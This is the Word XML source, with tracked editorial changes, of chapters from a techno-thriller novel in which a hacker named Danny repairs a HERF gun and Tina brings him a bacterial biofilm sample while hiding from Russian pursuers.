            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>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He turned his shoulder to display the dressing over his bullet wound. “You think I want to keep working with you? Are you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kidding me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? Right now, all I want is to rewind back to yesterday afternoon, when you offered me this little project, so I could tell you, ‘No, thanks.’ And in that alternate universe, I’ve spent all night tonight updating my LinkedIn profile and fiddling with my resume and flipping through job openings on Craigslist, and right now I’m staying up late re</w:t>
      </w:r>
      <w:del w:id="2264" w:author="TextVet" w:date="2016-03-22T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007B5EFF">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playing Skyrim because I know I don’t have work tomorrow.</w:t>
      </w:r>
      <w:ins w:id="2265" w:author="TextVet" w:date="2016-03-22T14:57:00Z">
        <w:r w:rsidR="00577909">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> where I’m supposed to be. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> my life. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> my home universe. But instead, I’m </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. And </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, I’ve spent the night…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 looked down at himself, at his shirtless torso and his wounded hand. He felt his shoulder throbbing. He took a long, slow, deep breath.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2266" w:author="TextVet" w:date="2016-03-22T14:58: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sorry, Jason.” He popped the car door open. “You want to continue this insanity? You’ll have to do it without me. Find some other pet cybermonkey to sic on your business rivals. I’m done.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0029329A" w:rsidRPr="000D3488" w:rsidRDefault="0029329A" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Staccato beeps sounded outside </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny’s front door as he punched in his keycode. The digital lock chirped and the deadbolt slid away under the pull of a solenoid. In the dark, the door’s insulation foam swished softly against the stone tiles in the entryway. Tired hiking-booted feet dragged themselves inside. Motion sensors detected a human-sized infrared blob, and the main room’s lights gently came to life to welcome Danny’s return.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home was spacious but simple. His foyer, kitchen, and living room formed one continuous L-shaped expanse which wrapped around his bedroom and bathroom. Ahead of him, the large kitchen was demarked by a granite-topped peninsula counter. To his side, the living room contained his black leather sofa, his carefully arranged surround-sound speakers, and an enormous entertainment system built to house a large LED TV and countless different kinds of gaming consoles both modern and vintage. A myriad of remotes and game controllers lay scattered on the coffee table, beside a metal arcade-style </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dance Dance Revolution</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> mat that lay nestled in the gray carpet. Soft spiraling tracks around the furniture marked the latest trip by the Roomba that sat resting in its recharging station.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first destination was through another door in the foyer, which led to his attached garage. Half of the space inside was dedicated to his Toyota Prius and his washer and dryer. The other half Danny had built into a digital electronics workshop. A solder-stained workbench formed the heart of his home laboratory, ringed by an oscilloscope, a logic analyzer, a naked computer with attached EEPROM burner, a box of Arduino boards, a whiteboard covered with equations and diagrams, and a wall full of small Plexiglas drawers holding assorted breadboard components.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laid the HERF gun on his workbench, prepared some heat-shrink insulation for the severed cables, and heated up a soldering iron. With his hand still smarting from </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>its injuries, with his torso still naked except for the gauze wrapping on his shoulder, with his brain still reeling from the fumes and the blood loss and the exhaustion, he nonetheless tended carefully to the beloved patient on his workbench. The surgery only took a minute. A few gentle dabs of solder and some hoarse blasts from a heat gun, and the high-voltage device was restored to operational status.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Before going back into the house, Danny found a spare power outlet and plugged the HERF gun into the wall. The lights in the garage dimmed. He left the device to feed for the night.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shuffled zombie-like to the bathroom, determined to cleanse himself of the stink of jet fuel and nail polish remover and soot and blood. His shower was very long and very hot</w:t>
      </w:r>
      <w:r w:rsidR="00136812">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00136812">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hen he finally emerged from the steam</w:t>
      </w:r>
      <w:ins w:id="2267" w:author="TextVet" w:date="2016-03-29T14:56:00Z">
        <w:r w:rsidR="00136812">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he felt freshly baptized. He found his home first-aid kit and clumsily reapplied his shoulder dressing, and treated his hand with bandages and salve. He dressed himself in pajamas, turned off the lights, and stumbled to his bedroom. He let himself fall into bed, closed his eyes, and wrapped the blankets around his body.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doorbell rang.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>20</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Eternity passed between</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> when she pressed the button and when the lights came on. She stood nervously outside the door, sweeping her hair aside. In her hands were white plastic Rite Aid bags, which she held in front of her like a flower girl with a basket of petals.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Finally, she heard shambling inside the house. She wiggled her waist for poise. She wished she’d had more time to fix her makeup, but the rush-job she had done in the rear-view mirror would have to suffice.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doorknob turned. She was greeted by a geeky zombie in slippers and blue linen pajamas. Danny stared at her bleary-eyed.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totally woke you up, didn’t I? I’m so sorry… I knew you’d probably be asleep…”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attempted a smile. Instead, his face winced with exhaustion. “It’s okay. Come on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soles of her black low-heel pumps tapped softly against the tile of Danny’s foyer. She looked around, delighted to see a civilized, ordered abode. She’d been worried that Danny’s place might look like Roger’s, a mess of laptops, laundry, and KidRobot dolls. And Natalie’s, of course, was even worse. Tina desperately needed a sense of order right now, and Danny’s house looked refreshingly sane. It was clean, uncluttered — and had a seriously sick entertainment system.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wordlessly took the bags from her and carried them to the granite kitchen counter, then mindlessly began shuffling back to the bedroom. After a few short steps, he stopped, blinked a few times, walked back to her, and said, “So… uh… what brings you by?”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“Well, I… I know this is kind of coming out of nowhere, but could I… Would you mind if I crashed here tonight? It’s just that… I’m…” Her lips began to tremble. She put </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>her hands near her face to hide her mouth. She felt like a tiny, helpless creature, and she hated it. “The Russians know everything about me. They know where I live. And I just keep thinking, I’m going to walk into my place and there’s going to be someone there. In my apartment. Waiting for me…” Tina couldn’t contain her distress. She put her face in her hands and began to sob into her palms. She huddled away from Danny, feeling pathetic and ashamed.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put a reassuring hand on her shoulder. “Shhhh, it’s alright,” he said, his voice groggy but warm. “They won’t find you here. You’ll be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pressed her face and hands against his chest and cried into his pajamas like a terrified and hurt child. His arms wrapped protectively around her, and he bowed his head to rest his cheek against her hair. The pressure of his warm, dexterous hands against her back filled her with safety and peace. He was not especially muscular, but his long arms held her in a firm sanctuary. Her body melted against his. He smelled like Irish Spring and fresh linen, and felt like home.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When the last of her arrhythmic sobs shook out of her, she gently pulled away. “Sorry about your PJs,” she said with an embarrassed smile as she batted at a snot-stain, her voice froggy.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smiled at her warmly. “You want some, like, tea or anything?”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nodded enthusiastically, and took a seat on a stool at the counter. As he filled a kettle in the sink, Tina noticed his new bandage. “What happened to your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“Fire,” he said absentmindedly. “Kerosene. Spark gap. Fumes. Boom. Everything burning. Also, I cut it on glass. Uh… oh yeah, your doctor friend isn’t gonna get her sweatshirt back.” He set the kettle on the electric stove. “How did you get here, anyway?”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 loaned me her car. Jason left her his contact info, and she texted him to get your address. He said he’d just dropped you off.”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asked groggily, “Why not crash at your friend’s place?”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shook her head. “I was going to, but then I realized they could find me there. I saw what you did with their phone — how you used the GPS history to figure out where they were keeping Julie. And I started thinking: they broke into my car, and my car has </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>GPS, and have I ever GPSed my way to Nat’s house? I couldn’t remember. And the thought of them finding Nat, and thinking that my BFF could be in danger because of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not because of you,” Danny reassured. “And it’s a long shot, anyway.”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know,” Tina said. “That’s what Nat told me, too. She said that blaming myself was just a defensive reflex of my ego trying to regain control. And that my paranoia was probably more harmful than any real danger. But I made her promise to stay at the hospital tonight regardless. She’s a doctor, so she gets to use those beds that the residents sometimes sleep on between shifts. Besides, she seemed perfectly happy to stay near Mike tonight. Those two were getting really cutesy together when I left.”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smiled. “Glad </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>something</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> good can come from this night, I guess.”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“Did you find Julie?” Tina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away. “She’s dead,” he said, just as the kettle whistled.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poured cups for the two of them and joined her at the counter. There, in the calm stillness of his house in the painfully late hour, he recounted the events of the factory. They sipped their tea, refilled their cups, and spoke.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And as he talked, Tina noticed him relax. While initially his muscles </w:t>
      </w:r>
      <w:ins w:id="2268" w:author="TextVet" w:date="2016-03-22T15:09:00Z">
        <w:r w:rsidR="002167E9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>had been</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2269" w:author="TextVet" w:date="2016-03-22T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002167E9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>were</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tight</w:t>
      </w:r>
      <w:ins w:id="2270" w:author="TextVet" w:date="2016-03-22T15:09:00Z">
        <w:r w:rsidR="002167E9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2271" w:author="TextVet" w:date="2016-03-22T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002167E9">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his speech </w:t>
      </w:r>
      <w:del w:id="2272" w:author="TextVet" w:date="2016-03-22T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002167E9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>halting, the more he told her</w:t>
      </w:r>
      <w:ins w:id="2273" w:author="TextVet" w:date="2016-03-22T15:11:00Z">
        <w:r w:rsidR="00725184">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the more he grew visibly at peace. As he finished his tale, he said quietly, “Thank you for coming over tonight,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leaned closer to him. “I’m glad I did.”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think you’ll find,” he </w:t>
      </w:r>
      <w:ins w:id="2274" w:author="TextVet" w:date="2016-03-22T15:14:00Z">
        <w:r w:rsidR="00D65635">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>enlightened,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2275" w:author="TextVet" w:date="2016-03-22T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D65635">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sweetly, “that the sleeping arrangements here are quite comfy.” He hopped down from his stool and stood beside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really?” she coyly replied. She looked up at him with eager, expectant eyes.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reached out to touch her. She inched forward on her stool. His </w:t>
      </w:r>
      <w:ins w:id="2276" w:author="TextVet" w:date="2016-03-22T15:18:00Z">
        <w:r w:rsidR="00F66EA7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fingertips</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2277" w:author="TextVet" w:date="2016-03-22T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F66EA7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hand</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2278" w:author="TextVet" w:date="2016-03-22T15:18:00Z">
        <w:r w:rsidR="00F66EA7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>alight</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2279" w:author="TextVet" w:date="2016-03-22T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F66EA7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>land</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed on her arm.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gave her a quick pat and said, “Yeah, my guest sheets are, like, a million thread count! Here, I’ll be right back…” He rushed off to his bedroom, came out a few moments later carrying blankets and a pillow, and zoomed off to the living room to dress the couch.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didn’t see Tina following him with her gaze, pouting with disappointment.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“Hey, Danny…”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“Yah?” he called back from the living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I didn’t come over here just to sleep…”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He trotted back to the kitchen.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paused until he approached. Then, with a roll of her shoulders, she said in a girlish squeak, “I brought you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raised an eyebrow. “What kind of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plastic bags lay at the end of the counter. Tina rifled through them, her teeth nibbling on her lower lip. She pulled out a latex glove. It was turned inside-out, and twisted and knotted near the base of the digits. “Do you remember,” she asked, “when we were back at the Rite Aid, when I first saw that the bacteria had formed a biofilm? Remember I scraped a bit of it out and held it with this glove?”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“Come take a look,” she said. She stretched a small segment of latex against her fingers. Inside the glove was a crumb of yellowish crusty substance, barely a few millimeters wide.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“Holy shit…” Danny gasped.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“See?” said Tina. “I know you’re upset about losing the vial to the Russians. This should cheer you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excitedly. “Is that one tiny flake enough to work with?”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theory it only takes one bacterium to grow an entire colony,” Tina answered.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are they still alive?” asked Danny. “And even if they are, can you wake them up from that filmy stasis mode without killing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flashed him an excited grin. “Let’s find out.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>21</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Clanging and clattering came from the cookware cabinet</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> as Danny dug around. He produced a two-gallon pot with lid.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“Here, wipe down the inside,” </w:t>
      </w:r>
      <w:del w:id="2280" w:author="TextVet" w:date="2016-03-22T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F4AC4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="2281" w:author="TextVet" w:date="2016-03-22T15:30:00Z">
        <w:r w:rsidR="009F4AC4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>nstructe</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d Tina as she tossed him some alcohol wipes. She arranged a row of bottles and bowls on the kitchen counter. The sleeves of her simple white button-down shirt were rolled up to her elbows </w:t>
      </w:r>
      <w:r w:rsidR="00544585">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">above </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">her </w:t>
      </w:r>
      <w:r w:rsidR="00544585">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">rubber-gloved </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hands. “Fill the pot with hot water, and pre</w:t>
      </w:r>
      <w:del w:id="2282" w:author="TextVet" w:date="2016-03-22T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000D3B0E">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heat the oven.”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carried the pot to the sink, and watched the hot water rise against the steel. Tina glided in from behind him singing, “Incoming!” She brought a Pyrex bowl filled with a flour-like powder, which she poured into the pot. As she stirred the mixture, she stood close enough for him to see the smudges on her face from hastily applied makeup, smell her floral perfume. Her cheeks were rosy, and her lips were drawn up in a coquettish smile.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water neared the brim</w:t>
      </w:r>
      <w:r w:rsidR="00184B69">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
